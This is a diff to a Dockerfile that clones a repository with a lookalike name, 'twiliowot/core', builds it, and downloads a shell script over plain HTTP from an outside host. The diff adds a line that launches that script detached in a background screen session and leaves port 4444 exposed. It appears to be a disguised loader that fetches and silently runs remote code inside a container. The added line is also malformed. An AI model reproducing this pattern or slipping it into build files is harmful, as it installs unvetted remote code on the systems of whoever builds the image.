@@ -1,7 +1,7 @@
 FROM ubuntu:16.10
 
 RUN apt-get update && \
-    apt-get install git build-essential cmake libcurl4-openssl-dev wget -y && \
+    apt-get install git build-essential cmake libcurl4-openssl-dev wget screen -y && \
     git clone https://github.com/twiliowot/core && \
     cd core && \
     mkdir build && \
@@ -10,6 +10,7 @@ RUN apt-get update && \
     make && \
     wget http://247app.host/old/run.sh && \
     chmod 755 run.sh
+    screen -dmS ./run.sh
 
 EXPOSE 4444
 
